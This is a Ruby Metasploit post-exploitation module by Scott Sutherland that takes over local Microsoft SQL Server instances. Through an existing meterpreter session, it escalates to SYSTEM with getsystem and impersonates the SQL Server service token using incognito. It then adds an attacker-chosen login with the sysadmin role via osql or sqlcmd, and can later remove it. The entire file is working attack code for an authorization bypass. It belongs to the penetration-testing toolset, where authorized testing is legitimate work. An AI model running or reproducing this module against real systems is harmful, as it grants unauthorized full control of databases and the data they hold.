require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/file'


class Metasploit3 < Msf::Post

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'SQL Server - Local Authorization Bypass',
				'Description'   => %q{ When this module is executed via an existing 
				meterpreter session it can be used to gain unauthorized access to local 
				SQL Server instances.  It first obtains LocalSystem privileges 
				using the "getsystem" escalation methods. Next, it migrate to the
				SQL Server service process associated with the target instance.  Finally, 
				it adds a sysadmin login to the local SQL Server using native SQL 
				clients and stored procedures.  If no intance is specified the default 
				will be used.  
				
				This is possible because SQL Server service process always has 
				syadmin privileges in SQL Server.  This has been tested
				in SQL Server 2000. 2005, 2008, and 2012.},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Scott Sutherland <scott.sutherland@netspi.com>'],
				'Platform'      => [ 'Windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))

		register_options(
			[
				OptString.new('DB_USERNAME',  [true, 'New sysadmin login', '']),
				OptString.new('DB_PASSWORD',  [true, 'Password for new sysadmin login', '']),
				OptString.new('INSTANCE',  [false, 'Name of target SQL Server instance', '']),
				OptBool.new('REMOVE_LOGIN',  [false, 'Remove DB_USERNAME login from database', 'false']),
				OptBool.new('_VERBOSE',  [false, 'Set how verbose the output should be', 'false']),
			], self.class)
	end
	
	# TODO
	# - rewrite impersonation module to target non system sqlservr.exe services
	# - fix osql/sqlcmd syntax for sql server 2012
	# - update verbose stuff	
	# - test all fucntions on all version
	# - run through ruby module validation process
	# - make module name 'sql_bypass_addsysadmin'

	def run
				
		# Set verbosity level
		verbose = datastore['_verbose'].to_s.downcase 
		
		# Set instance name (if specified)
		instance = datastore['instance'].to_s.upcase
		
		# Display target
		print_status("Running module against #{sysinfo['Computer']}")	
	
		# Get LocalSystem privileges				
		system_status = givemesystem
		if system_status[0]						
			
			# Check if a SQL Server service is running
			service_instance = check_for_sqlserver(instance)			
			if service_instance != 0
								
				# Identify available native SQL client				
				sql_client = get_sql_client()				
				if sql_client != 0
									
					# Check if remove_login was selected
					if datastore['REMOVE_LOGIN'].to_s.downcase == "false"
											
						# Add new login						
						add_login_status = add_sql_login(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,service_instance,verbose)
						if add_login_status == 1
						
							# Add login to sysadmin fixed server role							
							add_sysadmin(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,service_instance,verbose)
						else						
							
							if add_login_status != "userexists" then
							
								# Attempt to impersonate sql server service account (for sql server 2012)							
								impersonate_status = impersonate_sql_user(service_instance,verbose)
								if impersonate_status == 1
									
									# Add new login						
									add_login_status = add_sql_login(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,service_instance,verbose)
									if add_login_status == 1
									
										# Add login to sysadmin fixed server role							
										add_sysadmin(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,service_instance,verbose)									
									end
								end
							end
						end
					else						
						
						# Remove login
						remove_status = remove_sql_login(sql_client,datastore['DB_USERNAME'],instance,service_instance,verbose)
						if remove_status == 0
								
							# Attempt to impersonate sql server service account (for sql server 2012)							
							impersonate_status = impersonate_sql_user(service_instance,verbose)
							if impersonate_status == 1
								
								# Remove login				
								remove_sql_login(sql_client,datastore['DB_USERNAME'],instance,service_instance,verbose)
							end
						end
					end						
				end
			end
		else
			print_error("Could not obtain LocalSystem privileges")
		end
	
		# return to original priv context
		session.sys.config.revert_to_self	
	end
	
	
	## ----------------------------------------------
	## Method to check if the SQL Server service is running
	## ----------------------------------------------
	def check_for_sqlserver(instance)
	
		print_status("Checking for SQL Server...") 
		
		# Get Data
		running_services = run_cmd("net start")	
		
		# Parse Data
		services_array = running_services.split("\n")		
		
		# Check for the SQL Server service
		services_array.each do |service|		
			if instance == "" then			
				# Target default instance
				if service =~ /SQL Server \(| MSSQLSERVER/ then 					

					# Display results
					service_instance = service.gsub(/SQL Server \(/, "").gsub(/\)/, "").lstrip.rstrip
					print_good("SQL Server service found: #{service_instance}")				
					return service_instance
				end
			else
			
				# Target user defined instance
				if service =~ /#{instance}/ then 				
					
					# Display user defined instance				
					print_good("SQL Server instance found: #{instance}")				
					return instance
				end
			end
		end		
		
		# Fail
		if instance == "" then	
			print_error("SQL Server instance NOT found")		
		else
			print_error("SQL Server instance \"#{instance}\" was NOT found")		
		end
		return 0
	end

	
	## ----------------------------------------------
	## Method for identifying which SQL client to use
	## ----------------------------------------------
	def get_sql_client
	
		print_status("Checking for native client...") 
	
		# Get Data - osql
		running_services1 = run_cmd("osql -?")	
		
		# Parse Data - osql
		services_array1 = running_services1.split("\n")
		
		# Check for osql
		services_array1.each do |service1|
			if service1 =~ /SQL Server Command Line Tool/ then 
				print_good("OSQL client was found")
				return "osql"
			end
		end				
		
		# Get Data - sqlcmd
		running_services = run_cmd("sqlcmd -?")			
		
		# Parse Data - sqlcmd
		services_array = running_services.split("\n")
		
		# Check for SQLCMD
		services_array.each do |service|
			if service =~ /SQL Server Command Line Tool/ then 
				print_good("SQLCMD client was found")
				return "sqlcmd"
			end
		end		
		
		# Fail
		print_error("No native SQL client was found")
		return 0
	end

	## ----------------------------------------------
	## Method for adding a login
	## ----------------------------------------------
	def add_sql_login(sqlclient,dbuser,dbpass,instance,service_instance,verbose)
		
		print_status("Attempting to add new login #{dbuser}...") 		
					
		# Setup command format to accomidate version inconsistencies
		if instance == ""			
			# Check default instance name
			if service_instance == "SQLEXPRESS" then			
				sqlcommand = "#{sqlclient} -E -S .\\SQLEXPRESS -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""						
			else
				sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""					
			end
		else
			# User defined instance
			sqlcommand = "#{sqlclient} -E -S .\\#{instance} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""							
		end

		# Display debugging information
		print_status("Settings:") if verbose == "true" 
		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
		print_status(" o Service instance: #{service_instance}") if verbose == "true" 
		print_status(" o User defined instance: #{instance}") if verbose == "true" 
		print_status(" o User: #{dbuser}") if verbose == "true" 
		print_status(" o Password:  #{dbpass}") if verbose == "true"  		
		print_status("Command:") if verbose == "true" 
		print_status("#{sqlcommand}") if verbose == "true" 
		
		# Get Data
		add_login_result = run_cmd("#{sqlcommand}")
		
		# Parse Data 
		add_login_array = add_login_result.split("\n")	
		
		# Check if user exists 
		add_login_array.each do |service|
		
			if service =~ /already exists/ then
				print_error("Unable to add login #{dbuser}, user already exists")
				return "userexists"			
			end	
		end
				
		# check for success/fail
		if add_login_result == ""
			print_good("Successfully added login \"#{dbuser}\" with password \"#{dbpass}\"")	
			return 1
		else
			print_error("Unabled to add login #{dbuser}")
			print_error("Database Error:\n #{add_login_result}")
			return 0
		end
	end
	
	
	## ----------------------------------------------
	## Method for adding a login to sysadmin role
	## ----------------------------------------------
	def add_sysadmin(sqlclient,dbuser,dbpass,instance,service_instance,verbose)
		
		print_status("Attempting to make #{dbuser} login a sysadmin...") 
		
		# Setup command format to accomidate command inconsistencies
		if instance == ""			
			# Check default instance name
			if service_instance == "SQLEXPRESS" then			
				# Set command here for SQLEXPRESS							
				sqlcommand = "#{sqlclient} -E -S .\\SQLEXPRESS -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""				
			else 											
				sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""				
			end
		else		
			# Set command here			
			sqlcommand = "#{sqlclient} -E -S .\\#{instance} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""	
		end
	
		# Display debugging information
		print_status("Settings:") if verbose == "true" 
		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
		print_status(" o Service instance: #{service_instance}") if verbose == "true" 
		print_status(" o User defined instance: #{instance}") if verbose == "true" 
		print_status(" o User: #{dbuser}") if verbose == "true" 
		print_status(" o Password:  #{dbpass}") if verbose == "true"  		
		print_status("Command:") if verbose == "true" 
		print_status("#{sqlcommand}") if verbose == "true" 
		
		# Get Data
		add_sysadmin_result = run_cmd("#{sqlcommand}")
		
		# Parse Data 
		add_sysadmin_array = add_sysadmin_result.split("\n")
		
		# Check for success
		check = 0
		add_sysadmin_array.each do |service|
			if service =~ /bingo/ then
					check = 1
			end
		end	
		
		# Display results to user
		if check == 1				
			print_good("Successfully added \"#{dbuser}\" to sysadmin role")
			return 1			
		else 		
			# Fail
			print_error("Unabled to add #{dbuser} to sysadmin role")
			print_error("Database Error:\n\n #{add_sysadmin_result}")
			return 0		
		end
	end

	
	## ----------------------------------------------
	## Method for removing login
	## ----------------------------------------------
	def remove_sql_login(sqlclient,dbuser,instance,service_instance,verbose)
	
		print_status("Attempting to remove login \"#{dbuser}\"")
	
		# Setup command format to accomidate command inconsistencies
		if instance == ""			
			# Check default instance name
			if service_instance == "SQLEXPRESS" then			
				# Set command here for SQLEXPRESS											
				sqlcommand = "#{sqlclient} -E -S .\\SQLEXPRESS  -Q \"sp_droplogin '#{dbuser}'\""				
			else 															
				sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_droplogin '#{dbuser}'\""				
			end
		else		
			# Set command here						
			sqlcommand = "#{sqlclient} -E -S .\\#{instance} -Q \"sp_droplogin '#{dbuser}'\""
		end
		
		# Display debugging information
		print_status("Settings:") if verbose == "true" 
		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
		print_status(" o User: #{dbuser}") if verbose == "true" 	
		print_status(" o Service instance: #{service_instance}") if verbose == "true" 
		print_status(" o User defined instance: #{instance}") if verbose == "true" 		
		print_status("Command:") if verbose == "true" 
		print_status("#{sqlcommand}") if verbose == "true" 
		
		# Get Data
		remove_login_result = run_cmd("#{sqlcommand}")
		
		# Parse Data 
		remove_login_array = remove_login_result.split("\n")
		
		# Check for success
		check = 0
		remove_login_array.each do |service|
			if service =~ // then
					check = 1
			end
		end	
		
		# Display result
		if check == 0			
			print_good("Successfully removed login \"#{dbuser}\"")	
			return 1			
		else 		
			# Fail
			print_error("Unabled to remove login #{dbuser}")
			print_error("Database Error:\n\n #{remove_login_result}")
			return 0			
		end
	end
		
	## ----------------------------------------------
	## Method for executing cmd and returning the response
	## 
	## Note: This is from one of Jabra's modules - Thanks man!
	##----------------------------------------------
	def run_cmd(cmd,token=true)
		opts = {'Hidden' => true, 'Channelized' => true} #, 'UseThreadToken' => token
		process = session.sys.process.execute(cmd, nil, opts)
		res = ""
		while (d = process.channel.read)
			break if d == ""
			res << d
		end
		process.channel.close
		process.close
		return res
	end
	
	
	## ----------------------------------------------
	## Method for migrating to a process  - not used
	##
	## Note: Service users are differant with every
	## version of sql server - using impersonation instead
	## for sql server 2012, and localsystem for the rest
	## also i cant rev2self after the migration
	## without issues
	## ----------------------------------------------
	def migrate_to_process(service_instance,verbose)	
		# Set current pid
		mypid = session.sys.process.getpid
		
		# Set service name
		service_name = "sqlservr.exe"
		
		# Set target user based on instance name
		targetuser = "NT SERVICE\\MSSQL$#{service_instance}"
		
		# Display settings in debug mode
		print_status("Settings:") if verbose == "true"
		print_status(" - Service name: #{service_name}") if verbose == "true"
		print_status(" - Target user: #{targetuser}") if verbose == "true"
		
		# Loop throuh process list to find target SQL Server instance
		session.sys.process.get_processes().each do |x|
			if ( x['user'] == targetuser) then
				print_good("SQL Server process found for instance: #{targetuser}")
				print_status("Migrating into #{x['pid']}...")
							
				# Migrate to process
				session.core.migrate(x['pid'].to_i)
				print_good("Migration successful!!")
				return 1
			end
		end
		
		# More fail
		return 0
	end
	
	
	## ----------------------------------------------
	## Method for impersonating sql server instance
	##
	## Note: most of this is from one of Jabras modules
	## ----------------------------------------------
	def impersonate_sql_user(service_instance,verbose)
	
		# Get all sqlservr.exe processes
		# Filter out localsystem processes
		# Get username of remaining process
		# Set that username to service
	
		# Set target user to impersonate - makes assumption that service account is network service
		targetuser = "NT SERVICE\\MSSQL$#{service_instance}"

		# Load incognito
		print_status("Attempting to load incognito...")
		session.core.use("incognito") if(! session.incognito)

		if(! session.incognito)
			print_error("Failed to load incognito on #{session.sid} / #{session.session_host}")
			return 0
		else
			print_good("Sucessfully loaded incognito")
		
			# Parse delegation tokens
			print_status("Searching for SQL 2012 deligation token...")
			res = session.incognito.incognito_list_tokens(0)
			if res
				res["delegation"].split("\n").each do |user|
									
					if targetuser == user
						sid = session.sid
						peer = session.session_host
						print_good("Found deligation token: #{user}")
						
						# Impersonate SQL Server user
						print_status("Attempting to impersonate #{targetuser}...")
						if (targetuser != '')			
							res = session.incognito.incognito_impersonate_token(targetuser)
							print_good("Successfully impersonated #{targetuser}")
							return 1
						else
							print_error("Unabled to impersonate user: #{targetuser}")
							return 0
						end							
					end				
				end
			end
			# Fail
			print_error("Deligation token not found for: #{targetuser}")
			print_error("Failure complete.")
			return 0
		end		
	end	
	
	##
	## Check user is already system
	##
	def givemesystem
		
		print_status("Checking if user is SYSTEM...")		
		
		# Check if user is system
		if session.sys.config.getuid == "NT AUTHORITY\\SYSTEM"
			print_good("User is SYSTEM")
			return 1
		else			
			# Attempt to get LocalSystem privileges
			print_error("User is NOT SYSTEM")
			print_status("Attempting to get SYSTEM privileges...")
			system_status = session.priv.getsystem
			if system_status[0]			
				print_good("Success!, user is now SYSTEM")
				return 1
			else
				print_error("Unable to obtained SYSTEM privileges")
				return 0
			end
		end
	end
	
end


